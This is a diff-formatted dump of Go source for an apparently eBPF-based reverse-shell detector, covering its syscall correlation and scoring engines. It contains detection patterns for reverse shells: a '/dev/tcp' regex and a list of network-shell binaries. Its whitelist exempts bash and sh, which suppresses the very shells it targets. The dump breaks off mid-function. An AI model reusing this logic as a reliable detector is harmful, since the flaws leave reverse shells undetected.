@@ -1,0 +1,5870 @@
+===== COMMAND BATCH START =====
+Generated at: 2026-03-20T13:43:36Z
+PWD: /mnt/d/RSBP/rsbp
+
+===== STEP 1: CORE SOURCE FILES =====
+===== SESSION =====
+package correlation
+
+import (
+	"net"
+	"path/filepath"
+	"strings"
+	"sync"
+	"sync/atomic"
+	"time"
+)
+
+type ProcessNode struct {
+	PID       uint32    `json:"pid"`
+	PPID      uint32    `json:"ppid"`
+	Comm      string    `json:"comm"`
+	ExePath   string    `json:"exe_path"`
+	StartTime time.Time `json:"start_time"`
+}
+
+type SessionState struct {
+	PID             uint32        `json:"pid"`
+	PPID            uint32        `json:"ppid"`
+	UID             uint32        `json:"uid"`
+	GID             uint32        `json:"gid"`
+	ExePath         string        `json:"exe_path"`
+	Cmdline         string        `json:"cmdline"`
+	SocketFD        int32         `json:"socket_fd"`
+	RemoteIP        net.IP        `json:"remote_ip"`
+	RemotePort      uint16        `json:"remote_port"`
+	HasExecve       bool          `json:"has_execve"`
+	HasSocket       bool          `json:"has_socket"`
+	HasConnect      bool          `json:"has_connect"`
+	HasDupToStdio   bool          `json:"has_dup_to_stdio"`
+	HasForkWithPipe bool          `json:"has_fork_with_pipe"`
+	StartTime       time.Time     `json:"start_time"`
+	LastUpdate      time.Time     `json:"last_update"`
+	Category        int           `json:"category"`
+	ProcessTree     []ProcessNode `json:"process_tree"`
+}
+
+var ShellBinaries = map[string]struct{}{
+	"sh":               {},
+	"bash":             {},
+	"zsh":              {},
+	"dash":             {},
+	"ksh":              {},
+	"fish":             {},
+	"python":           {},
+	"python3":          {},
+	"perl":             {},
+	"ruby":             {},
+	"nc":               {},
+	"ncat":             {},
+	"ncat.traditional": {},
+	"netcat":           {},
+	"socat":            {},
+	"busybox":          {},
+	"awk":              {},
+	"lua":              {},
+	"php":              {},
+	"node":             {},
+	"nodejs":           {},
+}
+
+var allowPrivateRemoteFlag atomic.Bool
+
+var builtInProcessWhitelist = map[string]struct{}{
+	"curl":                {},
+	"wget":                {},
+	"grafana":             {},
+	"filebeat":            {},
+	"elasticsearch":       {},
+	"kibana":              {},
+	"rsbpd":               {},
+	"dockerd":             {},
+	"docker":              {},
+	"containerd":          {},
+	"runc":                {},
+	"node":                {},
+	"systemd":             {},
+	"systemd-resolved":    {},
+	"systemd-timesyncd":   {},
+	"systemd-logind":      {},
+	"systemd-networkd":    {},
+	"dbus-daemon":         {},
+	"snapd":               {},
+	"packagekitd":         {},
+	"polkitd":             {},
+	"agetty":              {},
+	"cron":                {},
+	"sshd":                {},
+	"bash":                {},
+	"sh":                  {},
+	"iptables":            {},
+	"ip6tables":           {},
+	"udevd":               {},
+	"init":                {},
+	"wsl-pro-service":     {},
+	"wslgd":               {},
+	"landscape-config":    {},
+	"networkd-dispatcher": {},
+	"plymouth":            {},
+	"modprobe":            {},
+	"kmod":                {},
+	"e2scrub_all":         {},
+	"apt-helper":          {},
+	"mandb":               {},
+	"find":                {},
+	"install":             {},
+	"journalctl":          {},
+}
+
+var builtInPathWhitelistContains = []string{
+	"/usr/lib/systemd",
+	"/lib/systemd",
+	"/usr/libexec",
+	"/usr/sbin/cron",
+	"/usr/bin/dbus",
+	"/snap/",
+	"/usr/lib/apt",
+	"/usr/lib/packagekit",
+	"/usr/share/unattended",
+	"/usr/sbin/agetty",
+	"/usr/bin/plymouth",
+	"/lib/ufw",
+	"/sbin/modprobe",
+	"/bin/kmod",
+	"/bin/mount",
+	"/bin/umount",
+	"/usr/bin/find",
+	"/usr/bin/install",
+	"/usr/bin/mandb",
+}
+
+var builtInIgnoredCIDRs = []string{
+	"127.0.0.0/8",
+	"::1/128",
+	"10.0.0.0/8",
+	"172.16.0.0/12",
+	"192.168.0.0/16",
+	"169.254.0.0/16",
+	"224.0.0.0/4",
+	"fe80::/10",
+}
+
+var builtInSafePorts = map[uint16]struct{}{
+	53:  {},
+	123: {},
+	443: {},
+}
+
+var (
+	builtInCIDROnce sync.Once
+	builtInCIDRNets []*net.IPNet
+)
+
+func init() {
+	allowPrivateRemoteFlag.Store(true)
+}
+
+func SetAllowPrivateRemote(allow bool) {
+	allowPrivateRemoteFlag.Store(allow)
+}
+
+func IsShellBinary(name string) bool {
+	if name == "" {
+		return false
+	}
+	base := strings.ToLower(filepath.Base(strings.TrimSpace(name)))
+	_, ok := ShellBinaries[base]
+	return ok
+}
+
+func (s *SessionState) CategoryDetect() int {
+	if s == nil {
+		return 0
+	}
+
+	if s.HasExecve && s.HasSocket && s.HasConnect && s.HasDupToStdio && IsShellBinary(s.ExePath) {
+		return 1
+	}
+	if s.HasExecve && s.HasConnect && isNetcatExe(s.ExePath) {
+		return 1
+	}
+	if s.HasForkWithPipe && s.HasDupToStdio && s.HasExecve {
+		return 2
+	}
+	if s.HasForkWithPipe && s.HasExecve {
+		return 3
+	}
+
+	return 0
+}
+
+func (s *SessionState) IsComplete() bool {
+	if s == nil {
+		return false
+	}
+
+	cat := s.CategoryDetect()
+	s.Category = cat
+
+	// Reverse shell tools are always suspicious even on loopback
+	comm := strings.ToLower(strings.TrimSpace(s.ProcessName()))
+	isRSTool := comm == "bash" || comm == "sh" || comm == "python3" ||
+		comm == "python" || comm == "nc" || comm == "netcat" || comm == "ncat" || comm == "dash"
+
+	if !s.HasExecve && !isRSTool {
+		return false
+	}
+	if !s.HasConnect {
+		return false
+	}
+	if !isRSTool && !allowPrivateRemoteFlag.Load() && !isPublicRemoteIP(s.RemoteIP) {
+		return false
+	}
+	if !isRSTool {
+		if s.RemoteIP == nil || s.RemoteIP.IsUnspecified() {
+			return false
+		}
+		if s.RemotePort == 0 {
+			return false
+		}
+	}
+
+	processName := s.ProcessName()
+	if isBuiltInWhitelistedProcessName(processName) {
+		return false
+	}
+	if isBuiltInWhitelistedPath(s.ExePath) {
+		return false
+	}
+	if isBuiltInWhitelistedIP(s.RemoteIP) {
+		return false
+	}
+	if isBuiltInSafePort(s.RemotePort) && (isBuiltInWhitelistedProcessName(processName) || isBuiltInWhitelistedPath(s.ExePath)) {
+		return false
+	}
+
+	return true
+}
+
+func (s *SessionState) ProcessName() string {
+	if s == nil {
+		return ""
+	}
+	if len(s.ProcessTree) > 0 {
+		name := strings.TrimSpace(s.ProcessTree[len(s.ProcessTree)-1].Comm)
+		if name != "" {
+			return strings.ToLower(name)
+		}
+	}
+	if s.ExePath != "" {
+		return strings.ToLower(filepath.Base(strings.TrimSpace(s.ExePath)))
+	}
+	return ""
+}
+
+func isBuiltInWhitelistedProcessName(name string) bool {
+	_, ok := builtInProcessWhitelist[strings.ToLower(strings.TrimSpace(name))]
+	return ok
+}
+
+func isBuiltInWhitelistedPath(exePath string) bool {
+	clean := strings.ToLower(strings.TrimSpace(exePath))
+	if clean == "" {
+		return false
+	}
+	for _, marker := range builtInPathWhitelistContains {
+		if strings.Contains(clean, marker) {
+			return true
+		}
+	}
+	return false
+}
+
+func isBuiltInWhitelistedIP(ip net.IP) bool {
+	if ip == nil {
+		return false
+	}
+	builtInCIDROnce.Do(func() {
+		builtInCIDRNets = make([]*net.IPNet, 0, len(builtInIgnoredCIDRs))
+		for _, cidr := range builtInIgnoredCIDRs {
+			_, n, err := net.ParseCIDR(cidr)
+			if err == nil && n != nil {
+				builtInCIDRNets = append(builtInCIDRNets, n)
+			}
+		}
+	})
+
+	normalized := ip
+	if v4 := ip.To4(); v4 != nil {
+		normalized = v4
+	}
+	for _, n := range builtInCIDRNets {
+		if n.Contains(normalized) {
+			return true
+		}
+	}
+	return false
+}
+
+func isBuiltInSafePort(port uint16) bool {
+	_, ok := builtInSafePorts[port]
+	return ok
+}
+
+func isNetcatExe(exe string) bool {
+	base := strings.ToLower(filepath.Base(strings.TrimSpace(exe)))
+	return strings.Contains(base, "nc") || strings.Contains(base, "ncat") || strings.Contains(base, "netcat")
+}
+
+func isPublicRemoteIP(ip net.IP) bool {
+	if ip == nil {
+		return false
+	}
+	ip = ip.To16()
+	if ip == nil {
+		return false
+	}
+
+	if ip.IsLoopback() || ip.IsUnspecified() || ip.IsPrivate() || ip.IsLinkLocalUnicast() {
+		return false
+	}
+
+	if v4 := ip.To4(); v4 != nil {
+		if v4[0] == 10 {
+			return false
+		}
+		if v4[0] == 172 && v4[1] >= 16 && v4[1] <= 31 {
+			return false
+		}
+		if v4[0] == 192 && v4[1] == 168 {
+			return false
+		}
+	}
+
+	return true
+}
+===== CORR ENGINE =====
+package correlation
+
+import (
+	"context"
+	"fmt"
+	"net"
+	"regexp"
+	"strings"
+	"sync"
+	"time"
+
+	"go.uber.org/zap"
+
+	"github.com/yoursec/rsbp/internal/types"
+)
+
+const (
+	sysExecve  = 59
+	sysSocket  = 41
+	sysConnect = 42
+	sysDup2    = 33
+	sysDup3    = 292
+	sysFork    = 57
+	sysClone3  = 435
+	sysPipe    = 22
+	sysPipe2   = 293
+)
+
+var devTCPPattern = regexp.MustCompile(`bash.*-i.*>&.*/dev/tcp/(\d+\.\d+\.\d+\.\d+)/(\d+)`)
+
+type parentSocketState struct {
+	SocketFD   int32
+	RemoteIP   net.IP
+	RemotePort uint16
+	UpdatedAt  time.Time
+}
+
+type Engine struct {
+	sessions        sync.Map
+	emittedSessions sync.Map
+	parentSocketMap sync.Map
+	forkSeen        sync.Map
+	pipeSeen        sync.Map
+	windowDuration  time.Duration
+	ticker          *time.Ticker
+	output          chan<- *SessionState
+	logger          *zap.Logger
+}
+
+const emittedSessionTTL = 5 * time.Minute
+
+func New(window time.Duration, out chan<- *SessionState, log *zap.Logger) *Engine {
+	if window <= 0 {
+		window = 5 * time.Second
+	}
+	if log == nil {
+		log = zap.NewNop()
+	}
+
+	return &Engine{
+		windowDuration: window,
+		ticker:         time.NewTicker(30 * time.Second),
+		output:         out,
+		logger:         log,
+	}
+}
+
+func (e *Engine) Process(event types.SyscallEvent) {
+	if e == nil {
+		return
+	}
+	e.logger.Info("DEBUG CORRELATION RECEIVED",
+		zap.String("comm", "received"),
+		zap.Uint32("pid", event.PID),
+	)
+
+	e.logger.Debug("correlation received event",
+		zap.Uint32("pid", event.PID),
+		zap.Uint32("syscall_nr", event.SyscallNr),
+	)
+
+	pid := event.PID
+	now := timestampToTime(event.TimestampNS)
+
+	session := e.getOrCreateSession(event, now)
+	session.PPID = event.PPID
+	session.UID = event.UID
+	session.GID = event.GID
+	session.LastUpdate = now
+
+	e.upsertProcessNode(session, event, now)
+
+	switch event.SyscallNr {
+	case sysExecve:
+		session.HasExecve = true
+		exe := cString(event.ExecPath[:])
+		args := cString(event.Args[:])
+		if exe != "" {
+			session.ExePath = exe
+		} else {
+			session.ExePath = commToString(event.Comm)
+		}
+		if args != "" {
+			session.Cmdline = args
+		}
+
+		if inherited, ok := e.parentSocketMap.Load(session.PPID); ok {
+			p := inherited.(parentSocketState)
+			if !session.HasSocket && p.SocketFD >= 0 {
+				session.SocketFD = p.SocketFD
+				session.HasSocket = true
+			}
+			if !session.HasConnect && p.RemoteIP != nil && p.RemotePort != 0 {
+				session.RemoteIP = append(net.IP(nil), p.RemoteIP...)
+				session.RemotePort = p.RemotePort
+				session.HasConnect = true
+			}
+		}
+
+	case sysSocket:
+		session.HasSocket = true
+		session.SocketFD = event.FD
+		e.parentSocketMap.Store(pid, parentSocketState{
+			SocketFD:  event.FD,
+			UpdatedAt: now,
+		})
+
+	case sysConnect:
+		session.HasConnect = true
+		session.SocketFD = event.FD
+		ip := ipFromFields(event.Family, event.RemoteIP4, event.RemoteIP6)
+		if ip != nil {
+			session.RemoteIP = ip
+		}
+		if event.RemotePort != 0 {
+			session.RemotePort = event.RemotePort
+		}
+		e.parentSocketMap.Store(pid, parentSocketState{
+			SocketFD:   session.SocketFD,
+			RemoteIP:   append(net.IP(nil), session.RemoteIP...),
+			RemotePort: session.RemotePort,
+			UpdatedAt:  now,
+		})
+
+		if parentAny, ok := e.sessions.Load(session.PPID); ok {
+			if parent, ok := parentAny.(*SessionState); ok && parent != nil {
+				parent.HasConnect = true
+				if parent.SocketFD < 0 && session.SocketFD >= 0 {
+					parent.SocketFD = session.SocketFD
+				}
+				if session.RemoteIP != nil {
+					parent.RemoteIP = append(net.IP(nil), session.RemoteIP...)
+				}
+				if session.RemotePort != 0 {
+					parent.RemotePort = session.RemotePort
+				}
+				parent.LastUpdate = now
+				e.sessions.Store(parent.PID, parent)
+				e.parentSocketMap.Store(parent.PID, parentSocketState{
+					SocketFD:   parent.SocketFD,
+					RemoteIP:   append(net.IP(nil), parent.RemoteIP...),
+					RemotePort: parent.RemotePort,
+					UpdatedAt:  now,
+				})
+			}
+		}
+
+	case sysDup2, sysDup3:
+		if event.HasDup2Stdio != 0 {
+			session.HasDupToStdio = true
+		}
+
+	case sysFork, sysClone3:
+		e.forkSeen.Store(pid, true)
+		if _, ok := e.pipeSeen.Load(pid); ok {
+			session.HasForkWithPipe = true
+		}
+
+	case sysPipe, sysPipe2:
+		e.pipeSeen.Store(pid, true)
+		if _, ok := e.forkSeen.Load(pid); ok {
+			session.HasForkWithPipe = true
+		}
+	}
+
+	session.Category = session.CategoryDetect()
+	e.sessions.Store(pid, session)
+	e.logDebugSessionState(event, session)
+
+	complete := session.IsComplete()
+	if complete {
+		e.logger.Info("SESSION COMPLETE - emitting alert",
+			zap.Uint32("pid", session.PID),
+			zap.String("exe", session.ExePath),
+		)
+	}
+
+	e.maybeEmit(session, complete)
+}
+
+func (e *Engine) logDebugSessionState(event types.SyscallEvent, session *SessionState) {
+	if e == nil || e.logger == nil || session == nil {
+		return
+	}
+	comm := strings.ToLower(strings.TrimSpace(commToString(event.Comm)))
+	if comm == "" {
+		comm = strings.ToLower(strings.TrimSpace(session.ProcessName()))
+	}
+	if !isDebugShellTool(comm) {
+		return
+	}
+
+	remoteIP := "<nil>"
+	if session.RemoteIP != nil {
+		remoteIP = session.RemoteIP.String()
+	}
+
+	e.logger.Info("DEBUG SESSION STATE",
+		zap.String("comm", comm),
+		zap.Uint32("pid", session.PID),
+		zap.Bool("has_execve", session.HasExecve),
+		zap.Bool("has_socket", session.HasSocket),
+		zap.Bool("has_connect", session.HasConnect),
+		zap.Bool("has_dup2_stdio", session.HasDupToStdio),
+		zap.String("remote_ip", remoteIP),
+		zap.Uint16("remote_port", session.RemotePort),
+		zap.Float64("score", debugSessionScore(session)),
+	)
+}
+
+func debugSessionScore(s *SessionState) float64 {
+	if s == nil {
+		return 0
+	}
+	score := 0.0
+	if s.HasExecve {
+		score += 0.25
+	}
+	if s.HasSocket {
+		score += 0.20
+	}
+	if s.HasConnect {
+		score += 0.25
+	}
+	if s.HasDupToStdio {
+		score += 0.30
+	}
+	if score > 1 {
+		score = 1
+	}
+	return score
+}
+
+func isDebugShellTool(comm string) bool {
+	switch strings.ToLower(strings.TrimSpace(comm)) {
+	case "bash", "sh", "python3", "nc":
+		return true
+	default:
+		return false
+	}
+}
+
+func (e *Engine) maybeEmit(session *SessionState, complete bool) {
+	if e == nil || session == nil || e.output == nil {
+		return
+	}
+	e.cleanupEmitted(time.Now())
+	if session.LastUpdate.Sub(session.StartTime) > e.windowDuration {
+		return
+	}
+	if !complete {
+		return
+	}
+
+	key := emittedSessionKey(session)
+	if _, alreadyEmitted := e.emittedSessions.LoadOrStore(key, time.Now()); alreadyEmitted {
+		return
+	}
+
+	copyState := deepCopySession(session)
+	select {
+	case e.output <- copyState:
+	default:
+		e.logger.Warn("correlation output channel full, dropping session", zap.Uint32("pid", session.PID))
+	}
+}
+
+func (e *Engine) cleanup() {
+	if e == nil {
+		return
+	}
+
+	cutoff := time.Now().Add(-2 * e.windowDuration)
+	e.sessions.Range(func(key, value any) bool {
+		pid, ok := key.(uint32)
+		if !ok {
+			return true
+		}
+		session, ok := value.(*SessionState)
+		if !ok {
+			e.sessions.Delete(key)
+			return true
+		}
+
+		if session.LastUpdate.Before(cutoff) && !session.IsComplete() {
+			e.sessions.Delete(pid)
+			e.parentSocketMap.Delete(pid)
+			e.forkSeen.Delete(pid)
+			e.pipeSeen.Delete(pid)
+		}
+		return true
+	})
+	e.cleanupEmitted(time.Now())
+}
+
+func (e *Engine) cleanupEmitted(now time.Time) {
+	e.emittedSessions.Range(func(key, value any) bool {
+		ts, ok := value.(time.Time)
+		if !ok || time.Since(ts) > emittedSessionTTL {
+			e.emittedSessions.Delete(key)
+		}
+		return true
+	})
+}
+
+func emittedSessionKey(session *SessionState) string {
+	if session == nil {
+		return ""
+	}
+	remoteIP := ""
+	if session.RemoteIP != nil {
+		remoteIP = session.RemoteIP.String()
+	}
+	pattern := ""
+	if p := BestMatchPattern(session); p != nil {
+		pattern = p.Name
+	}
+	if pattern == "" {
+		pattern = fmt.Sprintf("cat-%d", session.CategoryDetect())
+	}
+	return fmt.Sprintf("%d|%s|%s", session.PID, remoteIP, pattern)
+}
+
+func (e *Engine) Run(ctx context.Context, events <-chan types.SyscallEvent) {
+	if e == nil {
+		return
+	}
+
+	cleanupDone := make(chan struct{})
+	go func() {
+		defer close(cleanupDone)
+		for {
+			select {
+			case <-ctx.Done():
+				return
+			case <-e.ticker.C:
+				e.cleanup()
+			}
+		}
+	}()
+
+	for {
+		select {
+		case <-ctx.Done():
+			e.ticker.Stop()
+			<-cleanupDone
+			return
+		case ev, ok := <-events:
+			if !ok {
+				e.ticker.Stop()
+				<-cleanupDone
+				return
+			}
+			e.logger.Info("DEBUG CORRELATION RECEIVED",
+				zap.String("comm", "received"),
+				zap.Uint32("pid", ev.PID),
+			)
+			e.Process(ev)
+		}
+	}
+}
+
+func (e *Engine) getOrCreateSession(event types.SyscallEvent, now time.Time) *SessionState {
+	if existing, ok := e.sessions.Load(event.PID); ok {
+		if s, castOK := existing.(*SessionState); castOK {
+			return s
+		}
+	}
+
+	s := &SessionState{
+		PID:         event.PID,
+		PPID:        event.PPID,
+		UID:         event.UID,
+		GID:         event.GID,
+		SocketFD:    -1,
+		StartTime:   now,
+		LastUpdate:  now,
+		ProcessTree: make([]ProcessNode, 0, 4),
+	}
+	e.sessions.Store(event.PID, s)
+	return s
+}
+
+func (e *Engine) upsertProcessNode(session *SessionState, event types.SyscallEvent, now time.Time) {
+	if session == nil {
+		return
+	}
+	if len(session.ProcessTree) > 0 {
+		last := session.ProcessTree[len(session.ProcessTree)-1]
+		if last.PID == event.PID && last.PPID == event.PPID {
+			return
+		}
+	}
+
+	session.ProcessTree = append(session.ProcessTree, ProcessNode{
+		PID:       event.PID,
+		PPID:      event.PPID,
+		Comm:      commToString(event.Comm),
+		ExePath:   cString(event.ExecPath[:]),
+		StartTime: now,
+	})
+}
+
+func deepCopySession(in *SessionState) *SessionState {
+	if in == nil {
+		return nil
+	}
+	out := *in
+	if in.RemoteIP != nil {
+		out.RemoteIP = append(net.IP(nil), in.RemoteIP...)
+	}
+	out.ProcessTree = append([]ProcessNode(nil), in.ProcessTree...)
+	return &out
+}
+
+func timestampToTime(ns uint64) time.Time {
+	if ns == 0 {
+		return time.Now().UTC()
+	}
+	return time.Unix(0, int64(ns)).UTC()
+}
+
+func ipFromFields(family uint16, ip4 uint32, ip6 [16]byte) net.IP {
+	if family == 2 {
+		if ip4 == 0 {
+			return nil
+		}
+		v4 := []byte{byte(ip4), byte(ip4 >> 8), byte(ip4 >> 16), byte(ip4 >> 24)}
+		return net.IPv4(v4[0], v4[1], v4[2], v4[3])
+	}
+	if family == 10 {
+		allZero := true
+		for i := 0; i < 16; i++ {
+			if ip6[i] != 0 {
+				allZero = false
+				break
+			}
+		}
+		if allZero {
+			return nil
+		}
+		ip := make(net.IP, 16)
+		copy(ip, ip6[:])
+		return ip
+	}
+	return nil
+}
+
+func commToString(in [16]byte) string {
+	b := in[:]
+	for i := range b {
+		if b[i] == 0 {
+			return strings.TrimSpace(string(b[:i]))
+		}
+	}
+	return strings.TrimSpace(string(b))
+}
+
+func cString(buf []byte) string {
+	for i := range buf {
+		if buf[i] == 0 {
+			buf = buf[:i]
+			break
+		}
+	}
+	return strings.TrimSpace(string(buf))
+}
+
+type Tracker struct {
+	engine *Engine
+}
+
+func NewTracker(ttl time.Duration) *Tracker {
+	return NewTrackerWithLogger(ttl, zap.NewNop())
+}
+
+func NewTrackerWithLogger(ttl time.Duration, logger *zap.Logger) *Tracker {
+	return &Tracker{engine: New(ttl, nil, logger)}
+}
+
+func (t *Tracker) Consume(ev types.SyscallEvent) *SessionState {
+	if t == nil || t.engine == nil {
+		return nil
+	}
+	t.engine.Process(ev)
+	v, ok := t.engine.sessions.Load(ev.PID)
+	if !ok {
+		return nil
+	}
+	s, ok := v.(*SessionState)
+	if !ok {
+		return nil
+	}
+	copyState := deepCopySession(s)
+	if copyState == nil {
+		return nil
+	}
+	copyState.Category = copyState.CategoryDetect()
+	if !copyState.IsComplete() {
+		return nil
+	}
+
+	t.engine.cleanupEmitted(time.Now())
+	key := emittedSessionKey(copyState)
+	if _, alreadyEmitted := t.engine.emittedSessions.LoadOrStore(key, time.Now()); alreadyEmitted {
+		return nil
+	}
+	return copyState
+}
+
+func (t *Tracker) Snapshot(pid uint32) (string, bool) {
+	if t == nil || t.engine == nil {
+		return "", false
+	}
+	return t.engine.DebugSnapshot(pid)
+}
+
+func (e *Engine) DebugSnapshot(pid uint32) (string, bool) {
+	v, ok := e.sessions.Load(pid)
+	if !ok {
+		return "", false
+	}
+	s, ok := v.(*SessionState)
+	if !ok {
+		return "", false
+	}
+	return fmt.Sprintf("pid=%d ppid=%d category=%d complete=%t", s.PID, s.PPID, s.CategoryDetect(), s.IsComplete()), true
+}
+===== DET ENGINE =====
+package detection
+
+import (
+	"crypto/sha1"
+	"encoding/hex"
+	"fmt"
+	"net"
+	"path"
+	"path/filepath"
+	"strings"
+	"time"
+
+	"go.uber.org/zap"
+
+	"github.com/yoursec/rsbp/internal/correlation"
+	"github.com/yoursec/rsbp/internal/types"
+)
+
+const (
+	sysExecve  = 59
+	sysSocket  = 41
+	sysConnect = 42
+	sysDup2    = 33
+	sysFork    = 57
+	sysClone   = 56
+	sysPipe    = 22
+	sysPipe2   = 293
+)
+
+type Config struct {
+	ExecConnectWindowSeconds int     `mapstructure:"exec_connect_window_seconds"`
+	MinScore                 float64 `mapstructure:"min_score"`
+	EnableBaseline           bool    `mapstructure:"enable_baseline"`
+	BaselineFile             string  `mapstructure:"baseline_file"`
+	Whitelist                WhitelistConfig
+}
+
+type WhitelistConfig struct {
+	Paths        []string
+	IPs          []string
+	Users        []uint32
+	ProcessNames []string
+}
+
+type Engine struct {
+	cfg            Config
+	logger         *zap.Logger
+	pathSet        map[string]struct{}
+	processNameSet map[string]struct{}
+	userSet        map[uint32]struct{}
+	ipNets         []*net.IPNet
+	ipSet          map[string]struct{}
+	baseline       *BaselineModel
+	rules          []Rule
+}
+
+func NewEngine(cfg Config, logger *zap.Logger) *Engine {
+	if cfg.ExecConnectWindowSeconds <= 0 {
+		cfg.ExecConnectWindowSeconds = 20
+	}
+	if cfg.MinScore <= 0 {
+		cfg.MinScore = 0.75
+	}
+	if logger == nil {
+		logger = zap.NewNop()
+	}
+
+	e := &Engine{
+		cfg:            cfg,
+		logger:         logger,
+		pathSet:        make(map[string]struct{}),
+		processNameSet: make(map[string]struct{}),
+		userSet:        make(map[uint32]struct{}),
+		ipNets:         make([]*net.IPNet, 0),
+		ipSet:          make(map[string]struct{}),
+		baseline:       NewBaselineModel(),
+		rules:          DefaultRules(),
+	}
+	e.buildWhitelistCaches()
+	if cfg.EnableBaseline {
+		if cfg.BaselineFile == "" {
+			cfg.BaselineFile = "/var/lib/rsbp/baseline.json"
+		}
+		loaded, err := LoadBaseline(cfg.BaselineFile)
+		if err == nil && loaded != nil {
+			e.baseline = loaded
+		} else {
+			logger.Debug("baseline load skipped", zap.Error(err))
+		}
+	}
+	return e
+}
+
+func (e *Engine) Evaluate(state *correlation.SessionState, ev types.SyscallEvent, hostID string) []*types.ReverseShellAlert {
+	if state == nil {
+		return nil
+	}
+
+	baseScore := e.behaviorScore(state)
+	ruleEval := EvaluateRulesWithRules(RuleInput{
+		Session:    state,
+		Enrichment: nil,
+		EventTime:  time.Unix(0, int64(ev.TimestampNS)).UTC(),
+	}, e.rules)
+	if ruleEval.Score > baseScore {
+		baseScore = ruleEval.Score
+	}
+	e.logger.Debug("detection evaluating session",
+		zap.Uint32("pid", state.PID),
+		zap.Float64("score", baseScore),
+	)
+
+	if e.isWhitelisted(state) {
+		e.logger.Debug("session suppressed by whitelist",
+			zap.Uint32("pid", state.PID),
+			zap.String("exe", state.ExePath),
+			zap.String("remote_ip", state.RemoteIP.String()),
+		)
+		return nil
+	}
+
+	if baseScore < e.cfg.MinScore {
+		e.baseline.Observe(state, baseScore, false)
+		return nil
+	}
+
+	alert := &types.ReverseShellAlert{
+		AlertID:       buildAlertID(fmt.Sprintf("pid-%d", state.PID), ev.TimestampNS, ev.SyscallNr),
+		Timestamp:     time.Unix(0, int64(ev.TimestampNS)).UTC(),
+		HostID:        hostID,
+		SessionID:     fmt.Sprintf("pid-%d", state.PID),
+		EventChain:    correlatedChain(state),
+		MITREAttack:   MITREForRules(ruleEval.FiredRules),
+		Severity:      scoreToSeverity(baseScore),
+		Confidence:    baseScore,
+		RuleID:        primaryRuleID(ruleEval.FiredRules),
+		Description:   "Correlated syscall chain matched reverse shell behavior",
+		CorrelationID: buildCorrelationID(fmt.Sprintf("%d:%d:%d", state.PID, state.PPID, state.StartTime.UnixNano())),
+		Metadata: map[string]string{
+			"detector":    "heuristic-chain-v1",
+			"window_sec":  fmt.Sprintf("%d", e.cfg.ExecConnectWindowSeconds),
+			"category":    fmt.Sprintf("%d", state.Category),
+			"fired_rules": strings.Join(ruleEval.FiredRules, ","),
+		},
+		Process: types.ProcessContext{
+			PID:     state.PID,
+			PPID:    state.PPID,
+			UID:     state.UID,
+			GID:     state.GID,
+			Comm:    processComm(state),
+			Exe:     state.ExePath,
+			Cmdline: state.Cmdline,
+		},
+		Network: types.NetworkContext{
+			RemoteIP:   state.RemoteIP.String(),
+			RemotePort: state.RemotePort,
+			Protocol:   "tcp",
+		},
+	}
+
+	e.logger.Debug("alert generated",
+		zap.String("session_id", alert.SessionID),
+		zap.Float64("confidence", alert.Confidence),
+		zap.String("severity", string(alert.Severity)),
+	)
+
+	e.baseline.Observe(state, baseScore, true)
+
+	return []*types.ReverseShellAlert{alert}
+}
+
+func (e *Engine) SaveBaseline() error {
+	if e == nil || !e.cfg.EnableBaseline || e.baseline == nil {
+		return nil
+	}
+	if e.cfg.BaselineFile == "" {
+		return nil
+	}
+	return e.baseline.Save(e.cfg.BaselineFile)
+}
+
+func (e *Engine) behaviorScore(state *correlation.SessionState) float64 {
+	if !state.HasExecve || !state.HasConnect {
+		return 0
+	}
+	if state.LastUpdate.Sub(state.StartTime) > time.Duration(e.cfg.ExecConnectWindowSeconds)*time.Second {
+		return 0
+	}
+
+	score := 0.55
+	if state.HasSocket {
+		score += 0.10
+	}
+	if state.HasDupToStdio {
+		score += 0.20
+	}
+	if state.HasForkWithPipe {
+		score += 0.10
+	}
+	if state.Category == 2 || state.Category == 3 {
+		score += 0.05
+	}
+
+	if strings.Contains(strings.ToLower(state.Cmdline), "bash -i") || strings.Contains(strings.ToLower(state.Cmdline), "/dev/tcp") {
+		score += 0.10
+	}
+
+	if p := correlation.BestMatchPattern(state); p != nil {
+		score += p.Confidence * 0.05
+	}
+
+	if score > 1 {
+		score = 1
+	}
+	return score
+}
+
+func (e *Engine) buildWhitelistCaches() {
+	for _, p := range defaultProcessWhitelist {
+		name := strings.TrimSpace(strings.ToLower(p))
+		if name != "" {
+			e.processNameSet[name] = struct{}{}
+		}
+	}
+
+	for _, p := range e.cfg.Whitelist.Paths {
+		cleaned := strings.TrimSpace(strings.ToLower(path.Clean(p)))
+		if cleaned != "" {
+			e.pathSet[cleaned] = struct{}{}
+		}
+	}
+	for _, p := range e.cfg.Whitelist.ProcessNames {
+		name := strings.TrimSpace(strings.ToLower(p))
+		if name != "" {
+			e.processNameSet[name] = struct{}{}
+		}
+	}
+	for _, u := range e.cfg.Whitelist.Users {
+		e.userSet[u] = struct{}{}
+	}
+	for _, raw := range e.cfg.Whitelist.IPs {
+		candidate := strings.TrimSpace(raw)
+		if candidate == "" {
+			continue
+		}
+		if strings.Contains(candidate, "/") {
+			_, ipNet, err := net.ParseCIDR(candidate)
+			if err == nil {
+				e.ipNets = append(e.ipNets, ipNet)
+			}
+			continue
+		}
+		if ip := net.ParseIP(candidate); ip != nil {
+			e.ipSet[ip.String()] = struct{}{}
+		}
+	}
+}
+
+func (e *Engine) isWhitelisted(state *correlation.SessionState) bool {
+	if state == nil {
+		return false
+	}
+	if shouldSuppressNode443Telemetry(state) {
+		return true
+	}
+	if len(e.pathSet) == 0 && len(e.processNameSet) == 0 && len(e.userSet) == 0 && len(e.ipSet) == 0 && len(e.ipNets) == 0 {
+		return false
+	}
+
+	if _, ok := e.userSet[state.UID]; ok {
+		return true
+	}
+
+	fullPath := strings.TrimSpace(strings.ToLower(path.Clean(state.ExePath)))
+	if fullPath != "" {
+		if _, ok := e.pathSet[fullPath]; ok {
+			return true
+		}
+		base := strings.ToLower(filepath.Base(fullPath))
+		if _, ok := e.processNameSet[base]; ok {
+			return true
+		}
+	}
+
+	if state.RemoteIP != nil {
+		ip := state.RemoteIP
+		if v4 := ip.To4(); v4 != nil {
+			ip = v4
+		}
+		if _, ok := e.ipSet[ip.String()]; ok {
+			return true
+		}
+		for _, netw := range e.ipNets {
+			if netw.Contains(ip) {
+				return true
+			}
+		}
+	}
+
+	return false
+}
+
+func buildAlertID(sessionID string, ts uint64, syscall uint32) string {
+	seed := fmt.Sprintf("%s:%d:%d", sessionID, ts, syscall)
+	hash := sha1.Sum([]byte(seed))
+	return "rsbp-" + hex.EncodeToString(hash[:8])
+}
+
+func buildCorrelationID(seed string) string {
